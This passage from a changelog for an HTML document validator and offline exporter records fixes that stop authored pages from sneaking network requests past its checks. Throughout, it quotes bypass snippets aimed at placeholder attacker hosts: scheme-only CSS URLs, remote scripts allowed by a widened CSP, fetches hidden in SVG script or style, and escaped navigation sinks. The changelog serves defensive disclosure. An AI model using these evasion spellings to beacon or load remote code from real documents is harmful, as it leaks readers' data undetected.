  (`window.locatio\u006E.href`, `window.\u006Fpen(...)`, `location.hre\u0066`) - walks past both the
  exporter's strip and the strict validator, which match all of those as literal text. The one shape
  that survives the escape is a prefix name separated from its `.` (or `?.`) by WHITESPACE: the
  backwards walk skips that run and finds a legal boundary at it, so the literal remainder of the
  chain qualifies on its own. That is incidental rather than a defence - the same whitespace makes
  an arbitrary `zzz . location.href` match - and the corpus pins it beside a non-escaped control so
  it cannot be misread as one. The same literal matching cuts the other way in the local-binding
  shadow rule, and that direction costs an author content instead of letting a beacon out: an
  escaped `location` declaration does not register as a shadow, so a script that navigates nothing
  is deleted whole.
- Both directions are a decision, not an oversight. Recognizing each name as literal-or-escaped per
  character is possible without backtracking, but it turns a plain literal anchor search into a
  per-position automaton over every inline script - the exporter runs the same scan over the
  vendored payload's inflated megabytes - to close a channel computed access (`location["href"]`)
  already leaves open for a shorter edit. It also caps how much further hardening the URL literal is
  worth: an author who will not write an encoded scheme can write an encoded sink name for the same
  cost. The residual list, the runtime comment and the validator comment now say so, and a corpus
  pins every direction in BOTH engines against its plain-spelled twin - each escaped sample must
  DERIVE from that twin by substituting one parser-verified spelling, and each is compiled in the
  position it is actually used in - so the decision cannot be reversed, or quietly lost, without a
  test going red.
## [1.666.0] - 2026-08-04

### Fixed

- A region marker that a browser never parses as a boundary can no longer satisfy the validator's
  region check. The marker COUNT view is text and has no notion of an inert `<template>` (whose
  content does not run, does not load, and which `getElementById` never sees), of a CDATA section
  in foreign content, or of a raw-text body (`<script>`, `<style>`, `<textarea>`, `<title>`,
  `<noscript>`, ...), so it counts a marker written in any of them while no live parse builds a
  comment node there - a document could pass the layer's region check with a marker that is not a
  boundary, and every parse-driven check keyed on that region then failed OPEN. The chart-init
  guard was where that bit: it skips when the parse found no `END: commentable-html - JS` comment
  (deliberately, so a plain chart page is not flagged), so a `new Chart(` placed before such a
  marker was not reported and the whole document validated with zero errors and zero warnings.
  The parser now records the spans of every comment that mentions the marker text, split by
  whether it sits inside a `<template>`, and the layer check cross-checks the markers the region
  count ACCEPTED against them, naming the template or the raw-text body in the diagnostic. The
  Shareable CSS region's `/* ... */` markers inside a LIVE `<style>` are matched against that
  `<style>` body instead, since a browser never turns them into comment nodes - a `<style>` parked
  in a `<template>` does not qualify, so a whole inert CSS region can no longer validate clean. A
  count that is HIGHER in the blanked view than in the raw document is refused too, since a stray
  comment delimiter a raw-text body closes lets one view see a boundary the other does not. A
  decorated BEGIN comment of the shape the authoring tools emit is still a live boundary. The
  counted JS END marker must in addition be the same comment the chart guard's boundary reader
  accepts, so a comment carrying decoration or prose around the marker - or closed with the legacy
  `--!>` - is refused rather than silently leaving the guard's boundary unset. The chart-ONLY path
  (`--charts-only`, `validate_charts`), where the layer checks never run, now makes the same
  refusal itself, so the exploit is not simply reachable through a different entry point; a
  document with no counted marker at all remains the sanctioned skip, so a plain chart page is
  unaffected (CMH-VAL-20, CMH-CHART-02).


## [1.664.0] - 2026-08-04

### Fixed

- A sortable table nested in another sortable table's cell no longer loses its own sort when the
  reader exports. A table's persisted key is positional, and a nested table changes document index
  whenever the outer table's rows move, so the three call sites disagreed about which key belonged
  to it: `applyPersistedTableSorts` reads the UNSORTED startup DOM, `setupSortableTables` runs after
  the persisted sorts have been applied (an already-sorted DOM), and the export's canonical pass
  re-derived keys around its own unsort. A reader who sorted a nested table therefore persisted it
  under a key neither the next reload nor the export looked it up by, and the export silently left
  that table unsorted. Each table's key is now bound ONCE, on the unsorted startup DOM, and looked
  up by element from then on, so a click, a reload, and an export all agree; the key VALUES are
  unchanged for a document with no nested sortable table, so no reader loses a persisted sort.
- The export's canonical pass now captures each table's LIVE row order before its first unsort and
  puts exactly that order back, from a `finally`. The pass unsorts every table to canonicalize
  comment offsets, so a throw in between (an offset recompute that fails) previously left the reader
  looking at a permanently unsorted document rather than at a failed export. The order is REPLAYED
  rather than re-derived by re-sorting, because a re-sort is not an inverse of the unsort:
  `_sortRows` breaks ties on a row's current index, and an outer table sorted on a column whose
  cells hold a nested table ranks its rows by that cell's live text, so a successful export could
  hand the reader an order they never had.
- A failed export no longer leaves the reader's live comment offsets in authored-row coordinates.
  The canonical pass rewrites them in place, so a throw part-way through used to leave offsets that
  no longer described the restored (sorted) view; the next ordinary save persisted that mismatch and
  the load after it anchored the highlight onto an unrelated row. The pass now snapshots those
  offsets and puts them back when it does not complete (restored from the snapshot rather than
  recomputed, so unwinding cannot throw again and mask the real failure). The guard covers the
  no-sort fast path too, which rewrites the same offsets.
- Persisted sort state is validated the same way wherever it is read (a non-negative integer column
  and a direction of exactly `asc`/`desc`), so a corrupt `localStorage` entry that the load pass
  correctly ignores can no longer light up a column's sort chevron and `aria-sort` on a table that
  is in authored order.
- Persisted sorts now replay innermost-first, and one table that cannot be sorted no longer aborts
  the rest of startup: an outer table sorted on a column whose cells HOLD a nested table ranks its
  rows by that cell's text, so the nested table has to be back in its own order first or the outer
  table comes back in a different order than the reader left it.

## [1.663.0] - 2026-08-04

### Fixed

- The offline scripted-navigation check is no longer QUADRATIC on a long whitespace run in front
  of a `(` (CMH-OFFLINE-05). The sink search was made a linear anchored scan earlier, but the
  other full-text pass the predicate makes - the LOCAL-BINDING regex that decides whether a
  script declares its own `location`, and so which sinks still count - kept the shape that class
  of stall comes from: its `function` alternative joined two unbounded whitespace runs around an
  OPTIONAL identifier (`function WS* IDENT{0,100} WS* \(`), so a run never followed by an
  identifier was split every possible way and each split re-ran the bounded `[^)]{0,400}location`
  search. Through the public predicate that measured 0.13s at 5 KB, 1.4s at 20 KB and 22.5s at
  80 KB - four times the time for twice the input. The optional identifier and its own trailing
  run are now bound inside one group, so a whitespace run has a single parse and a failing split
  costs nothing; the recognized language is unchanged (the old spelling with zero identifier
  characters is the new group skipped, confirmed against the previous pattern over 415k crossed
  strings). Both callers feed this predicate unbounded document-supplied text and one of them
  inflates a compressed payload first, so an authored document could stall `validate.py --strict`
  and hang Export Offline in the reviewer's own browser tab for a few hundred bytes.
- The same local-binding regex no longer treats a name that merely CONTAINS `location` as a
  declaration of one (CMH-OFFLINE-05). It decides whether the UNPREFIXED navigation sinks still
  count, so matching text that declares nothing WEAKENS the egress check - and it needed a
  boundary at both ends of the name and of the keyword. Its bounded windows ended in a bare
  `location`, so any identifier ENDING in it counted (`function f(newLocation)`,
  `var {currentLocation}`), and the optional function-name slot absorbed the tail of a longer word
  (`functionx(location)`). Each of those is an ordinary spelling, and a one-token rename from any
  script, that bought the whole script the shadowed treatment and let a bare
  `location.href = "https://evil"` beacon past both the exporter and `validate.py --strict`. The
  three shapes are pinned as navigating, and the ANONYMOUS `function (location)` spelling - the
  branch where the optional name is skipped - is pinned as benign, so neither direction can
  regress. What this closes is the ACCIDENTAL disarm; the rule still decides on a character window
  over raw source, so a `location` merely MENTIONED in a comment, a string or a parameter default
  inside that window, or a non-ASCII identifier character in the boundary slot, still suppresses
  the unprefixed sinks. Both stay listed in the CMH-OFFLINE-05 residual, where the reason they are
  tolerable is unchanged - an author who writes one already has the cheaper aliasing bypass that
  residual accepts - and closing them needs the parameter list parsed rather than matched.
## [1.661.1] - 2026-08-04

### Fixed

- The validator's shared element boundaries no longer read a terminated `</` + whitespace end
  tag differently per interpreter (CMH-VAL-21). A browser's end-tag-open state accepts only an
  ASCII letter as a tag name, so `</ p>` and `<//>` open a BOGUS COMMENT that ends at the first
  `>` and close nothing at all. `html.parser` agreed only from 3.13: before it, `endtagfind`
  allowed whitespace after `</`, and `_BrowserBoundaries.parse_endtag` delegated the terminated
  case to the host - so a stray `</ main>` CLOSED an element on an older interpreter and was a
  comment on a newer one, which is one document with two element stacks, and so two cm-skip
  ancestries, two `#commentRoot` scopes and two raw-text bookkeepings. The case is now resolved
  explicitly (EOF is the text `</`, `</>` emits nothing, everything else is a bogus comment),
  so every check that reads the element stack sees the same document on every host. An
  unterminated one (`</ x` at end of input) now also raises `eof_unterminated`, as every other
  unterminated construct already did.

## [1.660.0] - 2026-08-04

### Fixed

- The strict validator's offline Content Security Policy check no longer lets a hand-authored file
  WIDEN the four fetch directives. Exclusivity was enforced only for the directives whose required
  token is `'none'`; for `script-src`, `style-src`, `img-src` and `font-src` the check asked only
  whether the required token was PRESENT, so a policy reading
  `script-src 'unsafe-inline' https://evil.example; img-src data: https://evil.example` passed.
  Combined with the slashes-required shape of the attribute network-URL test, a document carrying
  `<script src="https:evil.example/payload.js">` beside that policy passed `validate.py --strict`
  as offline-clean while a real browser fetched and EXECUTED the remote script. Each `'none'`
  directive must now be exactly `'none'`, and each of the four fetch directives must contain its
  required token and carry nothing outside a per-directive allowlist of source expressions that
  provably cannot fetch (`'unsafe-inline'`, `'unsafe-eval'`, `'wasm-unsafe-eval'`,
  `'unsafe-hashes'`, `'report-sample'`, `data:`, `blob:`). It is an allowlist rather than an exact
  match on the string the exporter emits, so a legitimate hand-authored policy is not rejected for
  no reason - but four shapes that look inert stay out of it: `'self'` (a `file://` document has an
  opaque origin, so what it matches is unspecified and has historically meant the containing
  directory), a hash source (CSP3 matches a hash against an external script carrying `integrity`),
  `'strict-dynamic'` and a nonce (both propagate trust to a network load). Directive names and
  source expressions are folded ASCII-only, since both are ASCII case-insensitive and a Unicode
  fold could map a look-alike onto a real token, and a repeated directive is now read the way a
  browser reads it - the FIRST copy is the policy - where the dict this was built from kept the
  last, letting a permissive first copy be masked by a strict repeat.
- The same check now counts only a policy `<meta>` a browser really APPLIES. It read the shared tag
  index, which records every start tag, so a policy parked in an inert `<template>` - or written
  after the head is over, where the HTML pragma directives are not processed at all - satisfied the
  requirement while enforcing nothing. It now reads a parser view that records a policy meta only
  in the head and outside a template (a `<noscript>` body was already excluded). Because CSP
  enforcement across several policies is conjunctive, any applied policy that meets the contract
  clears the check, and a failure reports the first policy's shortfalls. The Offline export emits
  exactly the required tokens and inserts the meta as the head's first child, so the file it
  produces passes unchanged and the gate and the strip still agree.
- Three more ways the offline policy could be read as enforcing something a browser does not, all
  closed with it. (1) The required directives are no longer the whole audit: CSP's more specific
  fetch directives OVERRIDE the ones the offline contract pins whenever they are present, so
  `script-src-elem https://evil.example` beside a compliant `script-src` re-opened the same hole
  verbatim, and `worker-src` opened it with no attribute spelling at all (`new Worker(...)` from
  the inline script the policy deliberately allows). The directive NAME set is now CLOSED - a
  directive outside the required set is an error unless its source list is exactly `'none'` or
  empty, neither of which can widen anything - which also rejects `report-uri`/`report-to`: a
  meta-delivered policy ignores them, so they enforce nothing and a document promising zero network
  has no use for a reporting endpoint. The directives that carry no source list at all
  (`upgrade-insecure-requests`, `block-all-mixed-content`, `require-trusted-types-for`,
  `trusted-types`, `sandbox`) are named instead of run through a source-list test their grammar
  does not have, and a required directive with an EMPTY source list is accepted for the same
  "matches nothing" reason `'none'` is. (2) The policy is tokenized on ASCII
  whitespace only, the way CSP tokenizes it. Python's `str.split()` is Unicode-aware, so a NBSP
  between a directive name and its value read as a separator here while a browser read the whole
  run as one unrecognized directive name and enforced nothing at all - one character per directive
  neutralized the policy while the check reported it complete. (3) A policy `<meta>` that arrives
  LATE is reported rather than read: a meta-delivered policy is not retroactive, so a `<script>`, a
  `<style>` that can `@import`, a fetching `<link>` or a `<noscript>` fallback written above it
  loads with no policy in force. Lateness is decided by capability, not by tag name: the six
  predecessors that can do neither whatever their attributes are inert (`html`, `head`, `meta`,
  `title`, `base`, `template`), a `<link>` is judged by whether its `rel` fetches, and a `<script>`
  by whether it carries a load attribute or a type a browser runs - so a `rel=canonical` link or an
  `application/json` block above the policy is not a false rejection.
- The head boundary this check uses is now the one the HTML parser draws, in all three directions.
  Non-whitespace character data in the head pops the head and opens the body, so a policy `<meta>`
  written after it is a body child whose pragma never runs (and only ASCII whitespace counts, since
  a browser ends the head on a NBSP); an end tag named `body`, `html` or `br` is "anything else" in
  both the "in head" and "after head" modes and ends it the same way, while every other end tag in
  those modes is ignored and must not; and `</head>` does not end it either, because the "after
  head" mode re-pushes the head element for a `base`/`link`/`meta`/`script`/`style`/`title`/
  `template` start tag, so a meta written there really is a head child and discarding it would
  report a document that has a policy as having none.

## [1.651.0] - 2026-08-04

### Fixed

- An author element wearing one of the layer's own control class names no longer SUPPRESSES the
  real control (CMH-CORE-21). Four modules decided "a control already exists here" from a bare
  class lookup, so a document that happened to carry `.cmh-sort-ctrl` in a table header, a
  `.cmh-sec-caret` or `.cmh-review-badge` in a heading, or a `.cm-widget-reset` in a draggable
  widget made the layer skip creating its own control entirely - the sort button, the section
  caret, the review badge, and "Reset moves" were silently missing (and the widget clean-up went
  further and DELETED the author's element). Every such guard now resolves the layer's own control
  by IDENTITY through `cmhOwnChrome`, against the `cmhMarkLayerChrome` registry, so only a control
  the layer itself created counts as already present, and the author's markup is neither read,
  removed, nor mistaken for chrome. The spoofed element gains nothing in exchange: it never enters
  the registry, so the comment dialog's outside-click guard still swallows a click on it as
  document content (CMH-CORE-16). This was a denial of the affordance, not a privilege escalation.
- The sidebar's expand-to-comment path now also restores the section caret's accessible NAME, not
  just its `aria-expanded` and tooltip, so a caret whose section was manually collapsed and then
  reopened by jumping to a comment inside it is no longer announced as "Expand section" while its
  section is open (CMH-CORE-21).
## [1.650.0] - 2026-08-04

### Fixed

- The offline CSS strips and the strict validator's CSS network-literal gates no longer miss a
  SCHEME-ONLY URL. `url(https:evil.example/x.png)` and `@import "https:evil.example/t.css"` carry no
  slashes after the colon, but the URL parser's special-authority states IGNORE whatever run of
  slashes follows a special scheme, so a browser resolves both to the same host as the `https://`
  spelling and really does fetch them from a `file://` document - while a `(?:https?:)?//` pattern
  read them as relative references. Both gates (`CSS_NETWORK_URL_RE` and the `@import` scan, now
  `CSS_NETWORK_IMPORT_RE`) and both of the exporter's matching strips (`_offlineCssNoNetwork`) now
  consume that slash run rather than counting it, and the attribute predicate that mirrors them
  (`NETWORK_URL_RE` / `_OFFLINE_NETWORK_URL_RE`) moves with them, so a one-token spelling change no
  longer walks past the layer that is not supposed to depend on the CSP. All of them were widened in
  the SAME change, because a gate that outran the exporter would reject a file the export had just
  produced. Each now also requires a non-empty HOST, so an authority terminated at once
  (`url(https://)`, `url(//)`, a bare `https:`) is left in the author's stylesheet instead of being
  reported as a beacon that fetches nothing - which also closes a small pre-existing drift, where
  the CSS gate reported `url(//)` and the strip left it alone. A new parity test runs the exporter's
  own CSS strip in the real JS engine over the corpus the Python gates are held to, so the two
  copies cannot drift apart again.
  The same change closes two narrower gate/strip disagreements the multi-duck panel found in the
  pair while reviewing it, both in the direction where `--strict` rejects a file the export has just
  produced: an `@import` whose URL is followed by a media query, a `layer()`/`supports()` clause or
  nothing at all (the strip demanded a terminator immediately after the URL; it now consumes the
  at-rule's prelude the way a CSS parser does, to its `;`, its block boundary or the end of the
  sheet), and a QUOTED value carrying a `)` or the other quote character (the strip now reads a
  quoted value as a CSS string rather than as "anything but a paren or a quote"). A THIRD shape was
  worse than drift: a `url(` token the CSS tokenizer closes but the author did not - unterminated at
  the end of the sheet, or with a quote that is never closed or is closed by the other quote - was
  verified FETCHING in a real Chromium while the strip left it in the exported file, so the strip
  now consumes such a token to the first `)` or the end of the sheet exactly as a browser does, and
  the same fallback covers an `@import` string that is never closed. `@import"https://host/x.css"`
  with NO whitespace after the at-keyword is valid CSS that fetches, and was missed by both sides;
  both now accept the empty separator. Both strips are BOUNDED - they stop at `;`, `{`, `}`, the
  next `@`, and either side of a comment boundary - so a false hit on `url(`/`@import` text inside a
  CSS string costs the declaration it sits in rather than the stylesheet, and consuming a comment's
  opener can no longer leave its `*/` behind and turn commented-out CSS into live CSS. They also run
  to CONVERGENCE, replacing a removed at-rule with a space, because a deletion can otherwise splice
  two inert fragments into a live `@import`.
  Both sides also now spell their whitespace out as the ASCII set instead of `\s` - a JavaScript
  `\s` also takes U+00A0 and U+FEFF, neither of which is CSS whitespace, so the two engines
  classified a BOM-carrying host differently - and both skip the padding the URL parser strips from
  inside a quoted value, so `url(" https://host/x.png")` is no longer read as a relative reference
  by either. The parity test now asserts the real contract, a FIXED POINT: after the exporter's own
  strip has run, the gate must no longer report the stylesheet.

## [1.612.0] - 2026-08-04

### Fixed

- The three tolerant parsers now end a heading where a browser ends it, so a truncated or
  ancestor-closed document is read the same way by the validator and by the tools that rewrite it
  (CMH-VAL-21). HTML5's h1-h6 start-tag pop is now STRUCTURAL in all of them - a browser pops
  whatever open heading is the current node, so a heading a parser never records (one inside a
  `cm-skip` subtree, or of a level the table of contents does not list) is popped too. Keyed on
  that record instead, an unterminated `cm-skip` heading stayed open and the VISIBLE heading after
  it inherited the skip: it vanished from the table of contents, from the section hashes and the
  document content hash, and from the validator's heading scan, though a browser renders it as an
  ordinary sibling. `section_hash.py`, which slices the
  review-tracking sections and the document content hash, gains all three boundaries: a heading
  still open at end of input is now closed by the PARSER rather than left for each caller to guess;
  the content root ends when an ANCESTOR of it closes, not only on the root's own end tag, so a
  document truncated before `</main>` no longer folds the text and the headings a browser puts
  outside the root into the last section's hash or the document hash - `</body>` and `</html>` are
  the exception and deliberately do NOT end it, because HTML5 only switches insertion mode on those
  and appends what follows to the element still open, which in such a document is `#commentRoot`
  itself (this parser's binding contract is the runtime hash in a real browser, so it follows the
  browser wherever that parts from the validator); and the h1-h6 pop above, so a heading's own text
  is its own. The table of contents parser in `generate_toc.py` already ended a heading at end of
  input and at an ancestor's close, and now takes the pop as well: `<h2 id="a">A<h2 id="b">B` is two
  entries instead of one that swallowed the second's text and never listed its id, and because the
  pop is not level-matched an `<h4>` ends an open `<h2>` exactly as a browser does. Every boundary
  above was settled against a real browser rather than a reading of the spec, and the extracted
  content-root text is pinned equal to chromium's over a corpus of malformed shapes.

## [1.602.0] - 2026-08-04

### Fixed

- The validator no longer syntax-checks inert `<template>` text as if it were mermaid diagram
  source (CMH-CONTENT-16, CMH-SYN-02). A `<template>`'s children live in its `.content`
  DocumentFragment, so they are NOT part of the host element's `textContent` - which is exactly
  what mermaid renders from - but `_DocParser.handle_data()` appended to the current mermaid
  block's source before its template guards, so a `<template>` nested inside a live
  `pre.mermaid` / `div.mermaid` fed its parked text to the mermaid checker. Hidden diagram text
  parked in such a template raised a mermaid syntax error for source the diagram never contains,
  and no edit to what renders could clear it. The capture now skips data inside a template,
  closed or left open to end of input, gated on the NAMESPACE-AWARE HTML-template floor so an
  element merely named `template` in a foreign namespace (`<math><template>`, which a browser
  keeps in the host's `textContent`) still hides nothing from the checker. Live text around the
  template is still checked, and a
  host whose ONLY text is parked is reported as the EMPTY block it renders as (mermaid's "No
  diagram type detected"). The reverse direction was already correct - a mermaid host that is
  itself inside a template is never registered as a live one - so both directions now agree.
  This is the same class of leak 1.437.0 closed for the prose, heading and cross-reference views
  and 1.579.0 closed for the wall-of-prose density advisory.

## [1.601.0] - 2026-08-04

### Fixed

- Nothing is raw text inside foreign content, so a `<svg><script>` or `<svg><style>` can no longer
  hide a live, network-loading element from the resource gates (CMH-VAL-21). The shared element
  boundaries kept `script` and `style` in raw-text mode even when the element was inserted in the
  SVG or MathML namespace; HTML5 does not - its "in foreign content" insertion mode takes both
  through "any other start tag", which inserts a foreign element and leaves the TOKENIZER in the
  data state, so the content is MARKUP. Chromium confirms it:
  `<svg><script><img src="https://evil.example/x.png"></script></svg>` really does build the `<img>`
  (`img` is a breakout tag, so it pops the open foreign elements and is inserted in the HTML
  namespace) and fetch it. Because both the tag lookup and the document parse read that region as
  text, the element was in NEITHER index, and a document that makes a network request could be
  certified self-contained (and pass offline mode). `_enter_raw_text()` now refuses outright outside
  the HTML namespace, and the host's own raw-text call is refused there too. The namespace-blind
  passes (checklist, notes, density) carry no namespace stack and keep the host's reading; that
  residual is now recorded in the spec and pinned by a test - it is contained, because those three
  key only on the author's own `data-cmh-*` attributes and prose density and no resource, egress or
  self-contained gate reads them.
- A `<style>` body a foreign-content BREAKOUT popped, or one that contains another `<style>`, no
  longer disappears from the CSS the offline and self-contained gates read (CMH-VAL-21). Once a
  foreign `<script>`/`<style>` holds markup, one can contain another and a breakout start tag can
  pop one before its own end tag arrives - and with one scalar capture per kind the inner element
  silently replaced the outer, so `<svg><style>@import url("//evil.example/a.css");<img>` followed
  by an innocent `<style>` recorded only the innocent rule while a browser still fetched the
  import. Each capture is now depth-keyed on a stack, finalized wherever a browser ends the element
  (its own end tag, an ancestor's, a breakout, end of input) rather than by end-tag NAME, so a
  stray `</style>` no longer ends a capture no element of it ever opened either. Each capture
  collects only the text a browser reads as its OWN (the element must be the current node), the
  recorded bodies are restored to document order, the template-parked view is a depth-keyed stack
  finalized the same way - so a script NESTED in a parked one is recorded with its own attributes,
  where folding it into the outer inert record let the offline gate skip a network import the
  exporter really carries - and the NonShareable watchdog token now counts only from a script that
  OPENED outside the content region, so one an author left open across the content-end marker
  cannot stand in for the layer's.

## [1.600.0] - 2026-08-04

### Fixed

- The scanners OUTSIDE the validator's `checks` package now fold every TAG and ATTRIBUTE name the
  way a browser folds it - ASCII-only - instead of with Python's Unicode `str.lower()` or a bare
  `re.IGNORECASE`. U+212A KELVIN SIGN is the one character outside ASCII whose `str.lower()` is an
  ASCII letter ("k") and U+017F LONG S is the one that lowercases to "s", so the checklist and
  notes appliers, the favicon detection the retrofit and upgrade tools inject from, and the
  remaining authoring passes each read `<lin\u212a>` as a `<link>`, `</mar\u212a>` as a `<mark>`
  closer and `data-cmh-chec\u212alist` as `data-cmh-checklist` - names a browser keeps distinct.
  That produced edits no browser can justify: an element treated as void so a note span or a
  checklist container never closed, a favicon that is not one, and a `data-comment-\u212aey`
  lookalike absorbing the write meant for the real attribute. They now derive from the same
  `BrowserTagNames` base the `checks` package uses, re-exported through the
  `tools/_browser_attrs.py` shim, and the few attribute maps and CSS selectors a tool still builds
  itself fold their names through the shim's `ascii_lower()`.
- The passes that REWRITE markup on a REGEX name match rather than through a parser now fold
  ASCII-only too, and assert the HTML name terminator instead of `\b`: the deck font fixer's
  remote-`<link>` strip, the Shareable conversion's companion, raw-text and layer-descriptor
  scans, and the upgrade masker's raw-text closer. Bare `re.IGNORECASE` let all of them delete or
  rewrite a `<lin\u212a>` a browser loads nothing for, and an ASCII `\b` would in turn have
  accepted `<link\u212a>` (U+212A is a non-word character under `re.ASCII`) - the same over-match
  in the mirror direction. A closer keeps its tolerant tail, since a span is only entered through
  a real opening tag and an over-matching closer ends it early rather than rewriting an element
  a browser does not have. The guards that only REFUSE to write, or escape MORE, keep the wider
  Unicode fold, because over-matching costs nothing there while a pass that over-matches corrupts
  the document. A structural gate fails a NEW scanner outside `checks` that derives straight from
  `html.parser.HTMLParser` without supplying the fold itself, so the host fold cannot come back.
  Completes CMH-VAL-21 clause 7 across the whole tool surface.

## [1.581.0] - 2026-08-04

### Fixed

- An END TAG can no longer match an ancestor across an open `<template>` boundary (CMH-VAL-21).
  `template` is a scoping element and its contents are parsed into their own DocumentFragment, so
  a closer written inside one - an explicit `</p>` or `</li>`, or any ancestor's closer - is
  IGNORED by a browser and the markup after it stays inert inside the template. The shared
  `_BrowserBoundaries` base modelled an open template as an ordinary stack entry, so
  `<main id="commentRoot"><p><template>inside</p><p>See the section below</p>` popped the template
  early and every template-aware view read inert markup as live: the prose /
  unlinked-cross-reference view, the element view (ids, canvases, anchors), the heading capture and
  the layer/marker views. The floor is tracked incrementally beside the namespace stack each parser
  keeps parallel to its own element stack, so the foreign-content bookkeeping is never truncated
  across the boundary either and an end tag still costs O(1); `</template>` itself still pops the
  template. The code-block tokenizer gets the same rule, so a `</code>`/`</pre>` parked in a
  template leaves the author's real block open for the callers to fail CLOSED on instead of
  silently ending it. A closer the boundary scopes away now reaches none of the parser's state
  machines either: a `</head>` parked in a template no longer ends the head (which dropped the
  favicon `<link>` a browser keeps in it), and a `</h2>` no longer flushes a heading opened
  outside the template (which stopped that heading's text at the template and collected the rest
  of it as ordinary prose). Those state machines key on the ELEMENT being closed rather than on
  the tag NAME, so a same-named element nested inside the template does not end the outer one
  either. The floor belongs to the shared base, so the tools that derive from it - `generate_toc`,
  `doc_stats`, `fix_skip`, both `wrap_sections` locators, both deck scanners and the contrast
  scanners - bound their own end-tag scans by it too, where a table of contents previously read
  "Real" for a heading a browser shows as "RealTail".
## [1.579.0] - 2026-08-04

### Fixed

- The wall-of-prose density advisory (CMH-VAL-15) no longer reads inert `<template>` content. A
  `<template>`'s contents live in a DocumentFragment a browser never renders, but the density
  check's own parser had no template awareness, so paragraphs parked inside
  `<main id="commentRoot"><template>...</template></main>` were counted as prose and could even be
  labelled by the template's own inner heading. An author who merely SHOWED a markup fragment with
  four or more long paragraphs got a warning no edit to the rendered page could clear. The parser
  now gates the whole pass off inside a template: parked paragraphs, headings, sections, layout
  blocks, and a parked kind meta all contribute nothing, the element itself never breaks a prose
  run (it renders nothing, so it cannot visually break up a wall), an end tag inside the fragment
  can never close an element opened outside it, and a template left unclosed at end of input - or
  a self-closed `<template/>`, which HTML5 opens like any other non-void tag - keeps the rest of
  the input inert, exactly as a browser leaves it in the fragment. This is the same class of leak
  1.437.0 closed for the prose and cross-reference pass.

  Two `<template>`s a browser DOES render are carved out, so the fix cannot hide a real wall: a
  declarative shadow root (`<template shadowrootmode="open">` or `"closed"`) is attached as the
  host's shadow tree at parse time, so it is read as the ordinary transparent container it
  displays as; and a `<template>` written inside raw-text or RCDATA content (`<title>`,
  `<textarea>`, `<noscript>`, `<script>`, ...) is prose a reader SEES, not a tag, so it cannot
  open the fragment. `shadowrootmode` is matched as the enumerated attribute it is (`" open"` is
  not `open`), and only the FIRST declarative shadow root on a given host attaches - a second one
  under the same parent, or one parked inside an ordinary template, stays inert - so the carve-out
  cannot invent a wall a reader never sees either. A kind meta inside the shadow tree does not set
  the document kind: a browser renders a shadow tree but never applies its metadata to the
  document, so it must not decide whether this advisory runs at all.

- The wall-of-prose density pass draws its element boundaries from the SHARED browser base
  (`_BrowserBoundaries`) instead of the host parser, so the raw-text and RCDATA set, the
  `</name` + whitespace/`/`/`>` closer, and the end-of-input rules are the same on every
  interpreter (CMH-VAL-21). `html.parser` knows only `script`/`style` before Python 3.13, knows
  `noscript` on no version, and before 3.13 refuses to end a raw-text region at a closer carrying
  attributes - so on the Python CI pins, a `<template>` or `</title data-x>` written in
  `<title>`/`<textarea>`/`<noscript>` TEXT used to be read as markup and could silently switch the
  whole advisory off for the rest of a document that warns correctly on 3.13.

## [1.574.0] - 2026-08-04

### Fixed

- The validator's tolerant HTML parsers no longer cost O(n^2) TIME on a deeply nested document. The
  HTML5 "close a p element" / "close an li element" step scanned the WHOLE open-element stack on
  every block-level start tag, stopping only at a scope boundary, so a document that opens many
  elements which are neither the target nor a boundary - `<div>` repeated with no closing tags -
  paid a full stack walk per tag: 3200 `<div>`s took 1.31s and a 5000-`<div>` document (~25 KB) had
  not finished after 240 seconds, which is enough to hang `validate` on a merely pathological file.
  Both the nearest open `<p>`/`<li>` and the nearest scope boundary are now tracked incrementally
  as the element stack grows, so the step is O(1) per tag with the SAME boundary semantics (button
  scope, list-item scope, and the foreign-content integration points are all unchanged). The
  ancestor questions the document parser asks per element - is an ancestor `cm-skip`, a
  `<template>`, a `<canvas>`, a `<pre>`, a chart `<figure>` or an `<a>`, and which
  `<svg>`/`<foreignObject>` is nearest - and the code-span parser's owning-`<pre>` and
  `figure.cmh-kql` lookups are answered from the same running summary rather than by walking the
  stack. The last walk goes too: an end tag matches the INNERMOST open element of its name, which
  was another backwards scan of the whole stack per end tag - unbounded when the tag was never
  opened, so `<div>` repeated followed by as many stray `</span>`s was quadratic by a second route
  (8000 of each measured 5.07s) - and the open elements are now indexed by name, so the match is
  O(1). That index holds the CURRENTLY open elements only (a bucket is dropped when it empties), so
  it grows with open depth rather than with the document's tag vocabulary. A 4000-`<div>` document
  now parses in 0.10s instead of 1.32s, and 20000 of them in 0.51s.

## [1.572.0] - 2026-08-04

### Fixed

- The authoring tools, the deck validator and the contrast scanner now draw the SAME element
  boundaries as the validator, not only the same attribute values (CMH-VAL-21). Their locators and
  scanners - `wrap_sections` (`_TopLevelLocator`, `_ContentRootLocator`), `generate_toc`,
  `doc_stats`, `fix_skip`, the deck validator's active-content and authored-content scans and the
  contrast scanner's style/document scans - were plain `html.parser` subclasses, so a
  `<main id="commentRoot">`, a `<pre class="mermaid">`, an `<h2>` or a `style=` an author only
  QUOTED inside a raw-text body (`<textarea>`, `<title>`, `<noscript>`, `<iframe>`, ...) was a real
  element to the tool and text to the validator - differently on Python 3.12 than on 3.13. That
  matters more in a tool than in a check: `wrap_sections` and `fix_skip` INSERT bytes at the
  offsets they report, so an element a browser never builds moved the edit into a reader's prose.
  They all derive from the shared `_BrowserBoundaries` now, through a new
  `tools/_browser_boundaries.py` shim that resolves it the same guarded way the attribute shim
  resolves the decode and degrades to the host's own boundaries, warned about once, on a broken
  install.
- The deck's egress scan no longer misses a resource behind a bogus `<![CDATA[`. `html.parser`
  consumes a whole `<![CDATA[ ... ]]>` marked section in every context, where a browser outside
  foreign content treats `<![CDATA[` as a bogus comment ending at the first `>` - so
  `<![CDATA[><img src="//cdn.example/x.png">]]>` left a remote fetch the deck really does perform
  and the scan never saw. Its `<noscript>` fallback is kept: that body is raw text with scripting
  ENABLED but live markup with scripting OFF, so the scan reads the WHOLE body twice - once each
  way - and unions the findings. Reading it twice rather than re-parsing the body the enabled
  tokenizer carved out is what closes the seam between the two views: that body ends at the first
  `</noscript`, which a scripting-disabled browser may never reach (it can sit inside a quoted
  attribute value, or inside a comment that hides it), so markup straddling the seam belonged to
  neither reading and a remote fetch went unreported. The scan also reports rather than passes when
  the shared boundaries are unavailable at all (a broken or partial install); the authoring tools
  deliberately degrade the other way and keep running, because a degraded edit beats a tool that
  cannot start.
- State an authoring tool keys on a stack index now ends wherever a BROWSER ends the element - its
  own end tag, an ancestor's end tag, HTML5's implicit `</p>` / `</li>` close, a foreign-content
